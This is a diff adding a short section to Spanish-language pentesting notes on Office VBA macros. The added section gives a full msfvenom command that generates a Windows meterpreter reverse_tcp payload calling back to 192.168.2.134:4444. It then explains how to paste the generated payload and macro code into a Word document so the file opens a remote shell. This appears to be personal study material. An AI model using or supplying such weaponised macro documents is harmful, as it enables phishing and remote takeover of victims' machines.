@@ -45,3 +45,11 @@ End Sub
 Ejemplo en word ->
 
 ![[Pasted image 20241210195150.png]]
+
+## Ejemplo con msfvenom
+
+```bash
+msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.2.134 LPORT=4444 -f vba-exe
+```
+
+Te da un output gigante que se ha de pegar en las macros de Office (el macro code es la subrutina) el payload hay que pegarlo en el documento de word y el código de macro en las macros del word (improtante fijarse si está hecho para word o excel).
